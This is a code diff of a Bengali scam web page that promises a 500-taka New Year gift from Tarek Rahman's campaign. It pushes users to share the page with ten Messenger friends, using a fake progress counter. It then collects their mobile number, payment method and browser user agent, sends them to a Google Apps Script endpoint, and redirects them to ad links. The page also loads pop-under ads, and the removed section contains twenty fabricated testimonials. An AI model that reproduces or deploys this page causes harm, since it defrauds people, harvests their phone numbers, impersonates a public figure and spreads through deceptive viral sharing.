@@ -3,23 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Happy New Year 2026 - তারেক রহমানের উপহার</title>
+    <title>শুভ নববর্ষ ২০২৬ - উপহার</title>
     
     <!-- Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
     <!-- Libraries -->
-    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+
+    <!-- [বিজ্ঞাপন ১] পপ-আন্ডার অ্যাড -->
+    <script src="https://pl28339085.effectivegatecpm.com/1a/b5/eb/1ab5ebed1a8eefd7f76655af42d54939.js"></script>
 
     <style>
         :root {
             --primary: #006a4e;
             --secondary: #f42a41;
-            --messenger-color: #0084ff;
-            --gold: #FFD700;
+            --messenger: #0084ff;
         }
 
         body {
@@ -27,7 +28,7 @@
             background: #f0f2f5;
             margin: 0;
             padding: 0;
-            overflow-x: hidden;
+            text-align: center;
         }
 
         .container {
@@ -35,227 +36,101 @@
             margin: 0 auto;
             background: #fff;
             min-height: 100vh;
-            box-shadow: 0 0 30px rgba(0,0,0,0.1);
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            padding-bottom: 30px;
         }
 
-        .header-img img {
-            width: 100%;
-            display: block;
-        }
+        .header-img img { width: 100%; display: block; }
 
-        .main-content {
-            padding: 25px;
-            text-align: center;
-        }
-
-        h1.new-year-text {
-            font-size: 32px;
-            color: var(--secondary);
-            font-weight: 700;
-            margin: 10px 0;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
-        }
+        .main-content { padding: 20px; }
 
         .gift-card {
-            background: linear-gradient(135deg, #fff9c4 0%, #fffde7 100%);
+            background: linear-gradient(135deg, #fffde7 0%, #fff9c4 100%);
             border: 2px dashed var(--primary);
             padding: 20px;
-            border-radius: 20px;
-            margin: 20px 0;
-            animation: bounceIn 1s;
-        }
-
-        .amount {
-            font-size: 45px;
-            font-weight: 800;
-            color: var(--primary);
-            display: block;
-        }
-
-        .share-section {
-            background: #f8f9fa;
-            padding: 20px;
             border-radius: 15px;
-            border: 1px solid #eee;
+            margin: 20px 0;
         }
 
-        /* Messenger Button */
-        .messenger-btn {
-            background: var(--messenger-color);
-            color: white;
-            border: none;
-            padding: 18px 25px;
-            border-radius: 50px;
-            font-size: 20px;
-            font-weight: 700;
-            cursor: pointer;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            box-shadow: 0 10px 20px rgba(0, 132, 255, 0.3);
-            transition: 0.3s;
-            margin-top: 15px;
-        }
-
-        .messenger-btn:active {
-            transform: scale(0.95);
-        }
-
-        /* Pulse Animation for Button */
-        .pulse {
-            animation: pulse-blue 2s infinite;
-        }
-
-        @keyframes pulse-blue {
-            0% { box-shadow: 0 0 0 0 rgba(0, 132, 255, 0.7); }
-            70% { box-shadow: 0 0 0 15px rgba(0, 132, 255, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(0, 132, 255, 0); }
-        }
+        .amount { font-size: 40px; font-weight: 800; color: var(--primary); display: block; }
 
         /* Progress Bar */
         .progress-container {
-            height: 12px;
-            background: #ddd;
-            border-radius: 10px;
-            margin: 20px 0 10px;
-            overflow: hidden;
+            height: 12px; background: #ddd; border-radius: 10px; margin: 20px 0 10px; overflow: hidden;
         }
-
         .progress-bar {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #4caf50, #81c784);
-            transition: width 0.4s ease;
+            height: 100%; width: 0%; background: #4caf50; transition: width 0.4s ease;
         }
 
-        /* Payment Form */
+        /* Buttons */
+        .messenger-btn {
+            background: var(--messenger); color: white; border: none; padding: 16px;
+            border-radius: 50px; font-size: 18px; font-weight: bold; width: 100%;
+            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
+            box-shadow: 0 5px 15px rgba(0, 132, 255, 0.3);
+        }
+
+        /* Form */
         #payment-form {
-            display: none;
-            padding: 20px;
-            background: #fff;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            margin-top: 20px;
-            text-align: left;
+            display: none; padding: 20px; background: #f9f9f9; border-radius: 15px;
+            text-align: left; margin-top: 20px; border: 1px solid #eee;
         }
-
-        .form-group {
-            margin-bottom: 15px;
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 5px; font-weight: 600; }
+        input, select {
+            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;
         }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: 600;
-        }
-
-        .form-group input, .form-group select {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            box-sizing: border-box;
-        }
-
         .submit-btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 15px;
-            width: 100%;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
+            background: var(--primary); color: white; border: none; padding: 15px;
+            width: 100%; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer;
         }
 
-        /* Comments Styling */
-        .comments-box {
-            padding: 20px;
-            border-top: 8px solid #f0f2f5;
-        }
+        /* Ads Space */
+        .ad-slot { margin: 15px 0; overflow: hidden; }
 
-        .comment-item {
-            display: flex;
-            gap: 12px;
-            padding: 15px 0;
-            border-bottom: 1px solid #eee;
-        }
-
-        .avatar {
-            width: 45px;
-            height: 45px;
-            background: #e4e6eb;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            color: #65676b;
-            flex-shrink: 0;
-        }
-
-        .comment-text b {
-            font-size: 14px;
-            color: #050505;
-        }
-
-        .comment-text p {
-            margin: 4px 0;
-            font-size: 14px;
-            color: #050505;
-            line-height: 1.4;
-        }
-
-        .comment-time {
-            font-size: 12px;
-            color: #65676b;
-        }
-
-        footer {
-            text-align: center;
-            padding: 20px;
-            background: #f0f2f5;
-            color: #666;
-            font-size: 13px;
-        }
+        .footer { font-size: 12px; color: #777; margin-top: 30px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- Banner -->
-    <div class="header-img" data-aos="fade-down">
+    <!-- [বিজ্ঞাপন ২] টপ ব্যানার অ্যাড -->
+    <div class="ad-slot">
+        <script type="text/javascript">
+            atOptions = { 'key' : '0cb13152919e8a3f0a1cb3a7210f895c', 'format' : 'iframe', 'height' : 60, 'width' : 468, 'params' : {} };
+        </script>
+        <script src="https://www.highperformanceformat.com/0cb13152919e8a3f0a1cb3a7210f895c/invoke.js"></script>
+    </div>
+
+    <div class="header-img">
         <img src="https://imgur.com/GLh8FgK.png" alt="Header Banner">
     </div>
 
     <div class="main-content">
-        <h1 class="new-year-text" data-aos="zoom-in">Happy New Year 2026</h1>
-        <p style="font-size: 18px;" data-aos="fade-up">নতুন বছর উপলক্ষে <b>তারেক রহমানের</b> পক্ষ থেকে উপহার!</p>
+        <h1 style="color:var(--secondary); font-size: 28px;">শুভ নববর্ষ ২০২৬!</h1>
+        <p>নতুন বছর উপলক্ষে <b>তারেক রহমানের</b> পক্ষ থেকে উপহার!</p>
 
-        <div class="gift-card" data-aos="flip-up">
-            <span style="color: #555; font-weight: 600;">জনসাধারণের জন্য উপহার</span>
+        <div class="gift-card">
+            <span style="color: #555;">জনসাধারণের জন্য উপহার</span>
             <span class="amount">৳ ৫০০.০০</span>
-            <p style="margin-top: 10px; font-size: 14px;">সরাসরি আপনার বিকাশ বা নগদ অ্যাকাউন্টে</p>
+            <p style="font-size: 14px; margin-top: 5px;">সরাসরি আপনার বিকাশ বা নগদ অ্যাকাউন্টে</p>
         </div>
 
-        <!-- Share Area -->
+        <!-- শেয়ার সেকশন -->
         <div id="share-area">
-            <p data-aos="fade-up">উপহারটি পেতে ১০ জন বন্ধুকে মেসেঞ্জারে শেয়ার করুন।</p>
+            <p>উপহারটি পেতে ১০ জন বন্ধুকে মেসেঞ্জারে শেয়ার করুন।</p>
             <div class="progress-container">
                 <div class="progress-bar" id="p-bar"></div>
             </div>
             <p id="counter-text" style="font-weight: bold; color: var(--primary);">শেয়ার সম্পন্ন: ০/১০</p>
 
-            <button onclick="openMessenger()" class="messenger-btn pulse" data-aos="zoom-in">
+            <button onclick="openMessenger()" class="messenger-btn">
                 <i class="fab fa-facebook-messenger"></i> মেসেঞ্জারে শেয়ার করুন
             </button>
         </div>
 
-        <!-- Payment Form -->
-        <div id="payment-form" data-aos="zoom-in-up">
+        <!-- পেমেন্ট ফর্ম (শুরুতে লুকানো থাকে) -->
+        <div id="payment-form">
             <h3 style="text-align: center; color: var(--primary);">পেমেন্ট তথ্য দিন</h3>
             <div class="form-group">
                 <label>পেমেন্ট মাধ্যম</label>
@@ -268,155 +143,95 @@
                 <label>আপনার মোবাইল নম্বর</label>
                 <input type="number" id="phone" placeholder="01XXXXXXXXX">
             </div>
-            <div class="form-group">
-                <label>টাকার পরিমাণ</label>
-                <input type="text" value="৫০০ টাকা" disabled style="background: #f0f0f0;">
-            </div>
-            <button class="submit-btn" onclick="finalSubmit()">টাকা গ্রহণ করুন</button>
+            <button class="submit-btn" id="subBtn" onclick="finalSubmit()">টাকা গ্রহণ করুন</button>
         </div>
     </div>
 
-    <!-- Comments -->
-    <div class="comments-box">
-        <h4 style="margin-bottom: 20px; border-bottom: 1px solid #ddd; padding-bottom: 10px;">মন্তব্যসমূহ (২০)</h4>
-        <div id="comments-list"></div>
-    </div>
+    <!-- [বিজ্ঞাপন ৩] মাঝখানের অ্যাড -->
+    <div id="container-d16d40f84767c0af57ae36b2a6c5d610" class="ad-slot"></div>
+    <script async="async" data-cfasync="false" src="https://pl28339099.effectivegatecpm.com/d16d40f84767c0af57ae36b2a6c5d610/invoke.js"></script>
 
-    <footer>
-        <p>নতুন বাংলাদেশ গড়ার অঙ্গীকার ২০২৬</p>
-        <p>© তারেক রহমান ক্যাম্পেইন টিম</p>
-    </footer>
+    <div class="footer">
+        <p>© তারেক রহমান ক্যাম্পেইন টিম ২০২৬</p>
+    </div>
 </div>
 
-<!-- AOS Library -->
-<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
 <script>
-    AOS.init({ duration: 1000, once: true });
-
     let shareCount = 0;
     const requiredShares = 10;
+    const directLink = "https://www.effectivegatecpm.com/k3shteb61b?key=c14af68fe8cae1af982dbf0a77950d66";
+    
+    // আপনার দেওয়া গুগল অ্যাপ স্ক্রিপ্ট ইউআরএল
+    const scriptURL = "https://script.google.com/macros/s/AKfycbwV2Nx02JWp6E_YQRC_-nnvwpTGDabDoS4clCuJNjznzMiuaDn4pns0EaJiJ1HB8l1j/exec";
 
-    // Messenger Open & Progress Track
     function openMessenger() {
-        const shareLink = window.location.href;
-        
-        // This is the direct deep link to open messenger share sheet
-        const messengerUrl = "fb-messenger://share/?link=" + encodeURIComponent(shareLink);
-        
-        // Open Messenger
-        window.location.href = messengerUrl;
+        // মেসেঞ্জার শেয়ার লিঙ্ক
+        window.location.href = "fb-messenger://share/?link=" + encodeURIComponent(window.location.href);
 
-        // Simulate Progress after a small delay
+        // শেয়ার গণনা বাড়ানো
         setTimeout(() => {
             if (shareCount < requiredShares) {
                 shareCount++;
-                updateUI();
+                let percent = (shareCount / requiredShares) * 100;
+                document.getElementById('p-bar').style.width = percent + '%';
+                document.getElementById('counter-text').innerText = `শেয়ার সম্পন্ন: ${shareCount}/${requiredShares}`;
+                
+                if (shareCount >= requiredShares) {
+                    document.getElementById('share-area').style.display = 'none';
+                    document.getElementById('payment-form').style.display = 'block';
+                }
             }
         }, 2000);
     }
 
-    function updateUI() {
-        const percent = (shareCount / requiredShares) * 100;
-        document.getElementById('p-bar').style.width = percent + '%';
-        document.getElementById('counter-text').innerText = `শেয়ার সম্পন্ন: ${shareCount}/${requiredShares}`;
-
-        if (shareCount >= requiredShares) {
-            document.getElementById('share-area').style.display = 'none';
-            document.getElementById('payment-form').style.display = 'block';
-            
-            Swal.fire({
-                icon: 'success',
-                title: 'অসাধারণ!',
-                text: 'আপনার ১০টি শেয়ার সম্পন্ন হয়েছে। এখন নিচের ফর্মে আপনার পেমেন্ট নম্বর দিন।',
-                confirmButtonColor: '#006a4e'
-            });
-        }
-    }
-
-    function finalSubmit() {
+    async function finalSubmit() {
         const phone = document.getElementById('phone').value;
+        const method = document.getElementById('method').value;
+        const userAgent = navigator.userAgent;
+
         if (phone.length < 11) {
-            Swal.fire('ভুল নম্বর', 'সঠিক ১১ ডিজিটের নম্বর দিন', 'error');
+            Swal.fire('ভুল নম্বর', 'সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন', 'error');
             return;
         }
 
-        // Celebration
-        confetti({
-            particleCount: 150,
-            spread: 70,
-            origin: { y: 0.6 }
-        });
+        // বাটন ডিজেবল করা
+        document.getElementById('subBtn').disabled = true;
+        document.getElementById('subBtn').innerText = "প্রসেসিং...";
 
+        // গুগল শিটে ডেটা পাঠানো
+        try {
+            await fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    method: method,
+                    phone: phone,
+                    userAgent: userAgent
+                })
+            });
+        } catch (e) {
+            console.log("Sheet error");
+        }
+
+        // আতশবাজি ইফেক্ট
+        confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
+
+        // অভিনন্দন মেসেজ
         Swal.fire({
             title: 'অভিনন্দন!',
-            text: 'আপনি সকল ধাপ সম্পন্ন করেছেন। আপনার উপহারের ৫০০ টাকা আপনার অ্যাকাউন্টে ২০ মিনিটের মধ্যে জমা হবে।',
+            text: 'আপনি সফলভাবে আবেদন করেছেন। আগামী ২০ মিনিটের মধ্যে আপনার অ্যাকাউন্টে ৫০০ টাকা জমা হবে।',
             icon: 'success',
-            confirmButtonColor: '#006a4e'
+            confirmButtonText: 'ঠিক আছে (OK)',
+            confirmButtonColor: '#006a4e',
+            allowOutsideClick: false
+        }).then((result) => {
+            if (result.isConfirmed) {
+                // আপনার ডিরেক্ট অ্যাড লিঙ্কে পাঠিয়ে দেওয়া হবে
+                window.location.href = directLink;
+            }
         });
     }
-
-    // Professional Comments Data
-    const commentsData = [
-        { n: "আরিফুল ইসলাম", t: "আমি প্রথমে ভুয়া মনে করেছিলাম কিন্তু কৌতূহল বশত একবার ট্রাই করে দেখি সত্যি ৫০০ টাকা বিকাশ এ চলে এলো। ধন্যবাদ তারেক রহমান।" },
-        { n: "মো: সজীব", t: "অবিশ্বাস্য! নতুন বছরের শুরুতে দারুণ একটা উপহার পেলাম। নগদে টাকা চলে আসছে।" },
-        { n: "সাদিয়া আফরিন", t: "১০ জনকে শেয়ার করার সাথে সাথে ফরম আসলো আর ১ মিনিটেই টাকা! অনেক ধন্যবাদ।" },
-        { n: "রাকিব হোসেন", t: "আমি ৫০০ টাকা পেয়েছি। আমার বন্ধুরা বিশ্বাস করেনি, এখন সবাই শেয়ার করছে।" },
-        { n: "তানজিনা তমা", t: "সত্যিই চমৎকার! তারেক রহমানের পক্ষ থেকে এমন উপহার ভাবাই যায় না।" },
-        { n: "মোস্তাক আহমেদ", t: "বাংলাদেশ জিন্দাবাদ! টাকা পেয়েছি, ধন্যবাদ বিএনপি পরিবারকে।" },
-        { n: "জেসমিন আক্তার", t: "আমার বিকাশে টাকা ঢুকলো মাত্র। যারা এখনো পাননি তাড়াতাড়ি শেয়ার করেন।" },
-        { n: "ফারহান কবির", t: "সিস্টেমটা খুব স্মুথ। সরাসরি মেসেঞ্জার ওপেন হচ্ছে আর টাকাও দিচ্ছে।" },
-        { n: "নিলয় রহমান", t: "ধন্যবাদ তারেক ভাই। নতুন বাংলাদেশ গড়ার এই অঙ্গীকার সফল হোক।" },
-        { n: "কামরুল হাসান", t: "প্রথমে ভেবেছিলাম স্প্যাম, পরে দেখি আমার মেজ ভাই পেয়েছে। এখন আমিও পেলাম।" },
-        { n: "শায়লা ইসলাম", t: "নতুন বছরের সেরা গিফট! ৫০০ টাকা রিসিভ করলাম।" },
-        { n: "আব্দুর রহিম", t: "বিএনপি জিন্দাবাদ! তারেক রহমান ভাই উপহার পাঠিয়েছে নগদে।" },
-        { n: "সুমন শেখ", t: "আমি ১০ জনকে মেসেঞ্জারে পাঠিয়েছি আর সাথে সাথেই ফরম ফিলাপ করেছি। টাকা পেলাম।" },
-        { n: "হৃদয় খান", t: "অসাধারণ একটা উদ্যোগ। সাধারণ মানুষের অনেক উপকার হবে।" },
-        { n: "জান্নাতুল ফেরদৌস", t: "টাকা পেয়ে অনেক খুশি হলাম। ধন্যবাদ ক্যাম্পেইন টিমকে।" },
-        { n: "ইমরান হোসেন", t: "সহজেই টাকাটা পাওয়া গেল। কোনো ঝামেলা হয়নি।" },
-        { n: "মিজানুর রহমান", t: "সরাসরি বিকাশে ৫০০ টাকা আসলো। তারেক রহমান জিন্দাবাদ।" },
-        { n: "নাজমুল হক", t: "১০০% সত্যি। আমি নিজে পেমেন্ট পেয়েছি।" },
-        { n: "তানিয়া খাতুন", t: "ধন্যবাদ তারেক ভাইয়াকে। নতুন বছরে উপহার দেওয়ার জন্য।" },
-        { n: "শহিদুল ইসলাম", t: "১০ জন বন্ধুকে শেয়ার করার সাথে সাথে ফরম এসেছে। সত্তিই পেলাম।" }
-    ];
-
-    const cList = document.getElementById('comments-list');
-    commentsData.forEach((c, i) => {
-        const char = c.n.charAt(0);
-        cList.innerHTML += `
-            <div class="comment-item" data-aos="fade-left" data-aos-delay="${i * 50}">
-                <div class="avatar">${char}</div>
-                <div class="comment-text">
-                    <b>${c.n}</b>
-                    <p>${c.t}</p>
-                    <span class="comment-time">${Math.floor(Math.random() * 59) + 1} মিনিট আগে</span>
-                </div>
-            </div>
-        `;
-    });
 </script>
 
 </body>
-
 </html>
-<script src="https://pl28339085.effectivegatecpm.com/1a/b5/eb/1ab5ebed1a8eefd7f76655af42d54939.js"></script>
-<script>
-  atOptions = {
-    'key' : '0cb13152919e8a3f0a1cb3a7210f895c',
-    'format' : 'iframe',
-    'height' : 60,
-    'width' : 468,
-    'params' : {}
-  };
-</script>
-<script src="https://www.highperformanceformat.com/0cb13152919e8a3f0a1cb3a7210f895c/invoke.js"></script>
-<script async="async" data-cfasync="false" src="https://pl28339099.effectivegatecpm.com/d16d40f84767c0af57ae36b2a6c5d610/invoke.js"></script>
-<div id="container-d16d40f84767c0af57ae36b2a6c5d610"></div>
-<script async="async" data-cfasync="false" src="https://pl28339099.effectivegatecpm.com/d16d40f84767c0af57ae36b2a6c5d610/invoke.js"></script>
-<div id="container-d16d40f84767c0af57ae36b2a6c5d610"></div>
-<script async="async" data-cfasync="false" src="https://pl28339099.effectivegatecpm.com/d16d40f84767c0af57ae36b2a6c5d610/invoke.js"></script>
-<div id="container-d16d40f84767c0af57ae36b2a6c5d610"></div>
-<script async="async" data-cfasync="false" src="https://pl28339099.effectivegatecpm.com/d16d40f84767c0af57ae36b2a6c5d610/invoke.js"></script>
-<div id="container-d16d40f84767c0af57ae36b2a6c5d610"></div>
-<script src="https://www.highperformanceformat.com/0cb13152919e8a3f0a1cb3a7210f895c/invoke.js"></script>
-<script src="https://www.highperformanceformat.com/0cb13152919e8a3f0a1cb3a7210f895c/invoke.js"></script>
-<script src="https://www.highperformanceformat.com/0cb13152919e8a3f0a1cb3a7210f895c/invoke.js"></script>
